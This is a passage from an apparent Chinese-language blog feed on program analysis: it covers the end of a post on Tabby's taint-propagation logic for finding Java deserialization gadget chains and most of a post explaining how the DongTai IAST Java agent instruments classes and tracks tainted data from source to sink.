<span class="keyword">if</span>(nextPos != <span class="keyword">null</span> &amp;&amp; nextPos.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                nextState.put(nextId, nextPos);</span><br><span class="line">                ret = next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Processer.process 实现了类似GadgetInspecotr的CallGraphDiscovery 污点传播计算。</p><ol><li>当前Node的Pollued污点，例如为0</li><li>经过当前RelationShip边，为下一个Node，下一个Node的POLLUTED_POSITION为0-&gt;0,1</li><li>计算出传播之后的Pollued污点为[0,1]</li><li>那么在nextState polluted里面增加一条记录，(边id，[0,1])，并通过</li><li>在下一次expand周期，state的值通过Process.init赋值给preState，并且取出pollued数组，根据lastRelationship获取当前Node的Pollued污点，如此循环</li></ol><p><strong>State</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;String, <span class="keyword">int</span>[]&gt; positions; <span class="comment">//保存id和污点信息</span></span><br><span class="line"><span class="keyword">private</span> List&lt;Long&gt; alias;</span><br><span class="line"><span class="keyword">private</span> List&lt;Long&gt; staticCalls;</span><br><span class="line"><span class="keyword">private</span> List&lt;Long&gt; nextAlias; </span><br></pre></td></tr></table></figure><h4 id="4-2-3-传播函数Demo"><a href="#4-2-3-传播函数Demo" class="headerlink" title="4.2.3 传播函数Demo"></a>4.2.3 传播函数Demo</h4><p><strong>Caculactor</strong></p><p>Caculactor 接口v2实现了根据上一个Call的POLLUTED_POSITION，和Node的polluted信息，计算下一个节点的polluted污点信息</p><p>ForwardedCalculator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] v2(<span class="keyword">int</span>[][] callSite, Set&lt;Integer&gt; polluted) &#123;</span><br><span class="line">    Set&lt;Integer&gt; nextPolluted = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> length = callSite.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> pos=<span class="number">0</span>; pos&lt;length; pos++)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] current = callSite[pos];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> c:current)&#123;</span><br><span class="line">            <span class="keyword">if</span>(polluted.contains(c))&#123;</span><br><span class="line">                nextPolluted.add(pos - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nextPolluted.stream().mapToInt(Integer::intValue).toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>callSite，由CALL.POLLUTED_POSITION</li><li>polluted，Node的污点信息，一般source节点，其值为-1</li><li>return nextPolluted，下一个Node的polluted</li></ul><p><img src="/images/pasted-351.png" alt="upload successful"></p><h2 id="0x05-总结与思考"><a href="#0x05-总结与思考" class="headerlink" title="0x05 总结与思考"></a>0x05 总结与思考</h2><p>思路结构上与GI区别不大，与GI的先passthrough再callgraph类似，tabby是先算Method的action，再算Call的pollutedPostion，但是在其基础上做了很多优化与拓展。</p><p>在实现需要的基础知识很多：</p><ul><li>Soot的FlowAnalysis 和ASM一样，也是需要对Jimple/Soot有较深的了解</li><li>Neo4j插件的实现也是，这块文档偏少，调试也困难</li></ul><p>没啥好说的，wh1t3p1g师傅🐮逼。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li>[1] <a href="https://github.com/knownsec/KCon/raw/master/2022/tabby%20java%20code%20review%20like%20a%20pro%E3%80%90KCon2022%E3%80%91.pdf">KCON: tabby java code review like a pro (by:wh1t3p1g)</a></li><li>[2] <a href="http://tttang.com/archive/1696/">tabby原理分析(by:cokeBeer)</a></li><li>[3] <a href="https://fynch3r.github.io/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/">Soot知识点整理(by:fynch3r)</a></li><li>[4] <a href="https://www.anquanke.com/post/id/234537">如何高效的挖掘Java反序列化利用链？(by:wh1t3p1g)</a></li><li>[5] <a href="https://www.anquanke.com/post/id/251814">如何高效地捡漏反序列化利用链？(by:wh1t3p1g)</a></li><li>[6] <a href="http://www.iro.umontreal.ca/~dufour/cours/ift6315/docs/soot-tutorial.pdf">soot-tutorial.pdf</a></li><li>[7] <a href="https://github.com/wh1t3p1g/tabby">wh1t3p1g/tabby</a></li><li>[8] <a href="https://github.com/wh1t3p1g/tabby-path-finder">tabby-path-finder</a></li><li>[9] <a href="https://view.csslcloud.net/api/view/index?roomid=D02BF113D16074BF9C33DC5901307461&userid=AEE7F6605EBD1C01">KCON 视频</a></li><li>[10] <a href="https://neoneo4j.com/docs/java-reference/current/extending-neo4j/project-setup/">Neo4j Docs: extending</a></li><li>[11] <a href="https://neo4j.com/docs/java-reference/current/traversal-framework/">Neo4j Docs: traversal-framework</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;与GadgetInspector 类似，Tabby 也是通过污点分析来实现的Gadget Chain挖掘。不同的是&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tabby 用soot 来做的静态污点分析，GadgetInspector 是用的ASM 模拟来做的污点跟踪&lt;/li&gt;
&lt;li&gt;用了Neo4j来做CPG 的查询与展示，要灵活很多&lt;/li&gt;
&lt;li&gt;优化了污点传播关系&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;据说Tabby 一开始是wh1t3p1g师傅的毕设，不过当时没放出tabby-path-finder，因此一直没太关注Tabby 污点分析这块，都是用手动白名单来做过滤的。KCon上师傅的PPT，收获很多，学习总结下。这里主要关注&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Tabby 污点传播规则&lt;/li&gt;
&lt;li&gt;Tabby soot 污点分析的实现&lt;/li&gt;
&lt;li&gt;Tabby Neo4j 搜索实现&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注：本文需要对soot 有一定了解，参考fynch3r 师傅的参考【3】。&lt;/p&gt;
&lt;h2 id=&quot;0x02-Soot-数据流分析&quot;&gt;&lt;a href=&quot;#0x02-Soot-数据流分析&quot; class=&quot;headerlink&quot; title=&quot;0x02 Soot 数据流分析&quot;&gt;&lt;/a&gt;0x02 Soot 数据流分析&lt;/h2&gt;&lt;p&gt;四步走：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-320.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="程序分析" scheme="http://m0d9.me/categories/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Tabby" scheme="http://m0d9.me/tags/Tabby/"/>
    
    <category term="污点分析" scheme="http://m0d9.me/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>DongTai IAST Java Agent分析</title>
    <link href="http://m0d9.me/2022/10/18/DongTai-IAST-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/10/18/DongTai-IAST-%E5%88%86%E6%9E%90/</id>
    <published>2022-10-18T02:19:00.000Z</published>
    <updated>2023-07-21T03:11:27.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-背景知识"><a href="#0x1-背景知识" class="headerlink" title="0x1 背景知识"></a>0x1 背景知识</h2><p>IAST 概念虽然很早就提出了，但是在实际使用情况中，因为其生产无侵入性与漏误报情况，实际使用效果还是不错的。</p><h3 id="1-1-IAST"><a href="#1-1-IAST" class="headerlink" title="1.1 IAST"></a>1.1 IAST</h3><ul><li>DAST (Dynamic Application Security Testing)</li><li>IAST (Interactive Application Security Testing)</li><li>RASP（Runtime Application Self-protection）</li><li>SAST (Static Application Security Testing)</li></ul><p>属IAST 最模糊，与三者都有纠缠。</p><h3 id="1-2-主动-与-被动"><a href="#1-2-主动-与-被动" class="headerlink" title="1.2 主动 与 被动"></a>1.2 主动 与 被动</h3><h4 id="1-2-1-主动IAST"><a href="#1-2-1-主动IAST" class="headerlink" title="1.2.1 主动IAST"></a>1.2.1 主动IAST</h4><p>主动IAST很简单，可以简单理解为 动态IAST = DAST + RASP</p><p><img src="/images/pasted-294.png" alt="upload successful"></p><a id="more"></a><h4 id="1-2-2-被动IAST"><a href="#1-2-2-被动IAST" class="headerlink" title="1.2.2 被动IAST"></a>1.2.2 被动IAST</h4><blockquote><p>被动型IAST是指使用动态污点分析技术，不需要扫描端，直接判断敏感参数是否为用户可控。插桩程序需要实现动态污点分析逻辑，实时监控程序污点数据变化，检测污点是否由source传播到sink点。</p></blockquote><p><img src="/images/pasted-295.png" alt="upload successful"></p><p>单看解释是有些疑问的：</p><ol><li>如果经历了安全函数，理论上用户输入会被过滤，变得不可控，这个怎么在被动上实现？</li><li>如果只是判断用户输入是否可控，为什么需要整个source 到sink 的stack，只看source 和sink 不行吗？</li></ol><h2 id="0x2-DongTai-IAST"><a href="#0x2-DongTai-IAST" class="headerlink" title="0x2 DongTai IAST"></a>0x2 DongTai IAST</h2><p>洞态IAST，原灵芝IAST，是国内首款开源的IAST，采用的也是“被动IAST” 技术，带着以上的问题，我们探究探究DongTai IAST的实现。</p><p>建议先看看su18师傅的《洞态 IAST 试用》，参考【1】，su18师傅的文章写的极好。</p><h3 id="2-1-前提"><a href="#2-1-前提" class="headerlink" title="2.1 前提"></a>2.1 前提</h3><p>DongTai 开源的有很多安全项目，这里只关注这两个</p><ul><li><a href="https://github.com/HXSecurity/DongTai">HXSecurity/DongTai</a>： Server</li><li><a href="https://github.com/HXSecurity/DongTai-agent-java">HXSecurity/DongTai-agent-java</a>：Java Agent</li></ul><p>DongTai 支持Java/Python/PHP/GO，这里仅对Java Agent 进行分析。<br>一开始以为Server功能比较简单，其实不是，Server也实现了一套污点逻辑，通过Agent上报的调用链进行判断，不过这里暂时先不关注。</p><h3 id="2-2-Server"><a href="#2-2-Server" class="headerlink" title="2.2 Server"></a>2.2 Server</h3><p>Server 采用Django + Celery，Celery broker 用的Redis，Django 数据库用的MySQL。重点关注自定义规则</p><h4 id="2-2-1-规则"><a href="#2-2-1-规则" class="headerlink" title="2.2.1 规则"></a>2.2.1 规则</h4><ul><li>污点源方法 Source</li><li>传播方法 Propagate</li><li>过滤方法 Filter</li><li>危险防范 Sink</li></ul><p><img src="/images/pasted-296.png" alt="upload successful"></p><ul><li>规则详情：方法的signature</li><li>污点输入：O/Px</li><li>污点输出：O/Px/R</li><li>Hook深度：是否也允许Hook子类的方法</li></ul><h4 id="2-2-2-传播方法Propagate"><a href="#2-2-2-传播方法Propagate" class="headerlink" title="2.2.2 传播方法Propagate"></a>2.2.2 传播方法Propagate</h4><p>如果分析过GadgetInspector 或者Tabby 的污点传播，那么对这些规则应该不会陌生。</p><p>传播方法描述的是一个污点在函数的路径，其中</p><ol><li>污点输入可以是：<ul><li>this，也就是object</li><li>args，方法的参数</li></ul></li><li>污点输出可以是：<ul><li>this，可以是object、field</li><li>return，返回值</li><li>args，注意这里，也就是Tabby 对GI的改进点</li></ul></li></ol><p>Source、Filter、Sink 都可以看作一种特殊的传播方法propagate。</p><h4 id="2-2-3-污点分析逻辑"><a href="#2-2-3-污点分析逻辑" class="headerlink" title="2.2.3 污点分析逻辑"></a>2.2.3 污点分析逻辑</h4><p>其实在Server 上，也是有一套污点判断逻辑，@TODO 待补充。</p><h3 id="2-3-Agent"><a href="#2-3-Agent" class="headerlink" title="2.3 Agent"></a>2.3 Agent</h3><h4 id="2-3-1-Java-Instrumentation-插桩"><a href="#2-3-1-Java-Instrumentation-插桩" class="headerlink" title="2.3.1 Java Instrumentation 插桩"></a>2.3.1 Java Instrumentation 插桩</h4><p>Java 两种插桩方式</p><ul><li>premain        agent 方式</li><li>agentmain        attach 方式</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load Class:&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在transfrom 中实现动态修改类，从而实现方法的Hook。</p><p>在DongTai中，具体为io.dongtai.iast.agent.AgentLauncher</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.dongtai.iast.agent.AgentLauncher#premain&#x2F;agentmain</span><br><span class="line">io.dongtai.iast.agent.AgentLauncher#install</span><br><span class="line">io.dongtai.iast.agent.AgentLauncher#loadEngine</span><br><span class="line">io.dongtai.iast.agent.manager.EngineManager#install</span><br></pre></td></tr></table></figure><p>install 会从server下载</p><ul><li>dongtai-core.jar</li><li>dongtai-spy.jar</li></ul><p>然后调用其中的install进行安装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String spyPackage = EngineManager.getInjectPackageCachePath();</span><br><span class="line">    String corePackage = EngineManager.getEnginePackageCachePath();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JarFile file = <span class="keyword">new</span> JarFile(<span class="keyword">new</span> File(spyPackage));</span><br><span class="line">        inst.appendToBootstrapClassLoaderSearch(file);</span><br><span class="line">        file.close();</span><br><span class="line">        <span class="keyword">if</span> (IAST_CLASS_LOADER == <span class="keyword">null</span>) &#123;</span><br><span class="line">            IAST_CLASS_LOADER = <span class="keyword">new</span> IastClassLoader(corePackage);</span><br><span class="line">        &#125;</span><br><span class="line">        classOfEngine = IAST_CLASS_LOADER.loadClass(ENGINE_ENTRYPOINT_CLASS);</span><br><span class="line">        String agentPath = <span class="keyword">this</span>.getClass().getProtectionDomain().getCodeSource().getLocation().getFile();</span><br><span class="line">        classOfEngine.getMethod(<span class="string">&quot;install&quot;</span>, String.class, String.class, Integer.class, Instrumentation.class,</span><br><span class="line">                        String.class)</span><br><span class="line">                .invoke(<span class="keyword">null</span>, launchMode, <span class="keyword">this</span>.properties.getPropertiesFilePath(),</span><br><span class="line">                        AgentRegisterReport.getAgentFlag(), inst, agentPath);</span><br><span class="line">        setRunningStatus(<span class="number">0</span>);</span><br><span class="line">        setCoreStop(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com.secnium.iast.core.AgentEngine#_init</span><br><span class="line">com.secnium.iast.core.AgentEngine#install</span><br><span class="line">com.secnium.iast.core.AgentEngine#run</span><br><span class="line">TransformEngine#start</span><br><span class="line">Instrumentation#addTransformer(IastClassFileTransformer)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IastClassFileTransformer#retransfrom</span><br><span class="line">IastClassFileTransformer#transfrom</span><br></pre></td></tr></table></figure><h4 id="2-3-2-retransfrom-Hook预处理"><a href="#2-3-2-retransfrom-Hook预处理" class="headerlink" title="2.3.2 retransfrom: Hook预处理"></a>2.3.2 retransfrom: Hook预处理</h4><p>IastClassFileTransformer#retransfrom 中实现了对Hook类的修改。具体逻辑如下：</p><ol><li><p>findForRetransform 发现所有的待Hook类，具体通过inst.getAllLoadedClasses 获取所有加载的类</p></li><li><p>通过configMatcher.isHookClassPoint(clazz) 简单筛选是否需要Hook，过一遍黑名单</p></li><li><p>通过classDiagram 获取该class的父类、接口</p></li><li><p>如果其中有在IastHookRuleModel.isHookClass()的，则会进入hook。isHookClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHookClass</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> hookClassnames.contains(className) || superClassHookPoints.contains(className) || hookBySuffix(className);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">hookBySuffix</span><span class="params">(String classname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String suffix : instance.suffixHookPoints) &#123;</span><br><span class="line">        <span class="keyword">if</span> (classname.endsWith(suffix)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-297.png" alt="upload successful"></p></li></ol><blockquote><p>问题：可以看到，Hook点内置，并没有控制台配置的sources/propagate/filter/sink，是在哪里实现hook的呢？</p></blockquote><blockquote><p>答案：不要被hook这个词迷惑，这里的isHookClass只有在findForRetransform中被用到，用来标记需要重载的类，并不是所有需要hook的类，需要hook的泪是在transfrom中的plugins dispatch中实现的。</p></blockquote><ol start="5"><li>随后调用 retransformClasses() 会让类重新加载，从而使得注册的类修改器能够重新修改类的字节码，这要就会调用之前通过 addTransformer() 注册的 IASTClassFileTransformer 中重写的 transform() 方法。</li></ol><h4 id="2-3-3-transfrom"><a href="#2-3-3-transfrom" class="headerlink" title="2.3.3 transfrom"></a>2.3.3 transfrom</h4><p>具体逻辑如下：</p><ol><li><p>如果是iast的类，则不进行任何处理</p></li><li><p>设置DONGTAI_STATE 标志，表示是否是IAST 内部代码</p></li><li><p>实现SCA，这个后续再跟</p></li><li><p>判断当前类是否在hook点黑名单。在在blacklist.txt 里维护了个7W多的hook黑名单： </p><ul><li>agent自身的类</li><li>已知的框架类、中间件类</li><li>类名为null</li><li>JDK内部类且不在hook点配置白名单中</li><li>接口</li></ul></li><li><p>创建 ClassWriter，依然是使用 COMPUTE_FRAMES 自动计算帧的大小，并且重写了getCommonSuperClass() 方法，在计算两个类共同的父类时指定ClassLoader。</p></li><li><p>创建 IASTContext 上下文，初始化 PluginRegister，这个类中包含了一个全局常量 PLUGINS，里面保存了很多的处理插件，这些类都实现了 DispatchPlugin 接口，这个接口包含两个方法：</p><ul><li>dispatch()：分发不同的 classVisitor 处理对应的类</li><li>isMatch()：判断是否命中当前插件</li></ul></li><li><p>在 ClassVisitor 中又通过重写 visitMethod() ，注册继承至 AbstractAdviceAdapter 的实现类，这些类重写父类的 before()/after() ，实际上是 AdviceAdapter 的 onMethodEnter()/onMethodExit() 实现了字节码的插入。详见下面plugins 一节。</p></li></ol><p><img src="/images/pasted-308.png" alt="upload successful"></p><h4 id="2-3-4-Plugins"><a href="#2-3-4-Plugins" class="headerlink" title="2.3.4 Plugins"></a>2.3.4 Plugins</h4><p>默认内置的Plugins：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PluginRegister</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.plugins = <span class="keyword">new</span> ArrayList&lt;DispatchPlugin&gt;();</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchSpringApplication());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchJ2ee());</span><br><span class="line">        <span class="comment">//PLUGINS.add(new DispatchJsp());</span></span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchCookie());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchDubbo());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchKafka());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchJdbc());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchShiro());</span><br><span class="line"><span class="comment">//        this.plugins.add(new DispatchHandlerInterceptor());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//PLUGINS.add(new DispatchSpringAutoBinding());</span></span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchClassPlugin());</span><br><span class="line">        plugins.add(<span class="keyword">new</span> DispatchGrpc());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>以DispatchShiro为例，重写了readSession方法，在内部增加了SpyDispatcherHandler#getDispatcher SpyDispatcher#isReplayRequest等逻辑调用，具体逻辑在SpyDispatcherImpl 中。</p><p><img src="/images/pasted-300.png" alt="upload successful"><br><img src="/images/pasted-299.png" alt="upload successful"></p><p>Plugins中，DispatchClassPlugin 比较特殊，dispatch中逻辑交由 PropagateAdviceAdapter/SinkAdviceAdapter/SourceAdviceAdapter处理，也就是控制台配置的Source、Sink、Propagate逻辑。</p><p><img src="/images/pasted-301.png" alt="upload successful"></p><h4 id="2-3-5-SpyDispatcherImpl"><a href="#2-3-5-SpyDispatcherImpl" class="headerlink" title="2.3.5 SpyDispatcherImpl"></a>2.3.5 SpyDispatcherImpl</h4><p>大部分的插桩逻辑都在SpyDispatcherImpl 中实现，比如SourceAdviceAdapter 的before。</p><p><img src="/images/pasted-309.png" alt="upload successful"></p><p>IastClassFileTransformer 在初始化的时候进行了SpyDispatcherHandler的初始化SpyDispatcherImpl，以供全局使用。</p><h2 id="0x3-功能分析"><a href="#0x3-功能分析" class="headerlink" title="0x3 功能分析"></a>0x3 功能分析</h2><h3 id="3-1-SCA"><a href="#3-1-SCA" class="headerlink" title="3.1 SCA"></a>3.1 SCA</h3><p><img src="/images/pasted-302.png" alt="upload successful"></p><p>通过sendReport接口发送给server</p><p><img src="/images/pasted-303.png" alt="upload successful"></p><h3 id="3-2-漏洞判断"><a href="#3-2-漏洞判断" class="headerlink" title="3.2 漏洞判断"></a>3.2 漏洞判断</h3><p>这块su18师傅已经讲了个大概逻辑，但是没具体讲污点传播，这里详细讲下。</p><p>以普通http漏洞为例，这个过程会经历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DispatchClassPlugin#dispatch</span><br><span class="line">SourceAdviceAdapter#before/after</span><br><span class="line">    PropagateAdviceAdapter#before/after</span><br><span class="line">    SinkAdviceAdapter#before/after</span><br><span class="line">      AbstractAdviceAdapter#captureMethodState</span><br><span class="line">          SpyDispatcherImpl#collectMethodPool</span><br><span class="line">              HttpImpl.solveHttp</span><br><span class="line">              SourceImpl.solveSource</span><br><span class="line">              PropagatorImpl.solvePropagator</span><br><span class="line">              SinkImpl.solveSink</span><br></pre></td></tr></table></figure><h4 id="3-2-1-污点跟踪逻辑"><a href="#3-2-1-污点跟踪逻辑" class="headerlink" title="3.2.1 污点跟踪逻辑"></a>3.2.1 污点跟踪逻辑</h4><p><strong>重点关注全局变量EngineManager</strong></p><ul><li><p>EngineManager.TRACK_MAP</p><ul><li>存的污点传播路径</li><li>当开始准备跟踪时，进行初始化，如SourceImpl#sloveSource.</li><li>当跟踪完成时，进行remove，如SpyDispatcherImpl#leaveHttp</li></ul></li><li><p>EngineManager.TAINT_HASH_CODES</p><ul><li>存的污点值的hash</li></ul></li><li><p>EngineManager.TAINT_RANGES_POOL</p><ul><li>存的污点值所在范围，污点一般为string，例如为hash所对应的string的子串</li></ul></li></ul><blockquote><p>疑问：EngineManager.TRACK_MAP 会在SpyDispatcher<br>Impl#leaveHttp 进行清空复位，是建立在“一个HTTP请求一个线程”的基础上的，对于Netty之类的异步框架是如何支持的呢？</p></blockquote><p><img src="/images/pasted-352.png" alt="upload successful"></p><blockquote><p>Tomcat 异步NIO模式实际上是针对“读取socket并交给Worker中的线程”，而request到response这一过程还是串行的，因此如此处理是没有问题：“request-&gt;response过程是独占同一个线程”。Netty的异步机制不确定，待研究。</p></blockquote><p><strong>重点关注变量MethodEvent</strong></p><p>其中<br>source = event.inValue / event.inValueString<br>target = event.outValue / event.outValueString</p><p>source:O = event.object<br>source:P = event.argumentArray<br>target:O = event.<br>target:P = event.<br>target:R = event.returnValue/event.OutValue</p><p><strong>具体的流程如下：</strong></p><h5 id="1-HttpImpl-solveHttp"><a href="#1-HttpImpl-solveHttp" class="headerlink" title="1. HttpImpl#solveHttp"></a>1. HttpImpl#solveHttp</h5><p>一次请求到达了应用程序，首先进入 http 节点处理逻辑，进行标记和预处理。</p><ul><li>重放处理/标记</li><li>黑名单/后缀</li><li>增加http 头</li></ul><h5 id="2-SourceImpl-solveSource"><a href="#2-SourceImpl-solveSource" class="headerlink" title="2. SourceImpl#solveSource"></a>2. SourceImpl#solveSource</h5><p>请求进入到 source 点，将 event 放入 EngineManager.TRACK_MAP 中，将 source 的结果放入了 EngineManager.TAINT_POOL 污点池中。</p><p>Source的传播比较单一，一般只有</p><ul><li>O-R</li><li>P-R</li></ul><p>具体逻辑如下：</p><ul><li>如果method return为空或者为int之类的无效污染，退出</li><li>如果method 为getAttrribute，那么仅允许白名单内的arg，这两步是为了执行效率考虑</li><li>将event 加入EngineManager.TRACK_MAP 中</li><li>将source 的结果放入了 EngineManager.TAINT_HASH_CODES/TAINT_RANGES_POOL 污点池中：<strong>如果source的结果是Map、Collection、Array之类的，会进一步遍历其所有值，都加入TAINT_HASH_CODES/TAINT_RANGES_POOL</strong></li></ul><p><img src="/images/pasted-310.png" alt="upload successful"></p><blockquote><p>疑问：solveSource 中只有P-R，没有处理O-R的情况，是漏掉了？</p></blockquote><p><img src="/images/pasted-311.png" alt="upload successful"></p><blockquote><p>SourceImpl 是起点，起点的inValue 对结果并没有什么影响。重要的只是outValue，是整个污染连的起点。因此简单讲inValue设置成argumentArray并不会影响结果。</p></blockquote><h5 id="3-PropagatorImpl-solvePropagator"><a href="#3-PropagatorImpl-solvePropagator" class="headerlink" title="3. PropagatorImpl#solvePropagator"></a>3. PropagatorImpl#solvePropagator</h5><p>请求进入propagator 节点时，根据配置判断传播节点的参数是否存在于污点池中，如果是，则将传播节点 event 放入 EngineManager.TRACK_MAP 中。</p><p>Propagate有很多种传播逻辑：</p><ul><li>P-R </li><li>P-O</li><li>P-P 这个少见</li><li>O-P</li><li>O-O 这个也少见，只有一条规则java.lang.StringBuffer.setLength(int)</li><li>O-R</li></ul><p>除此之外，Propagate 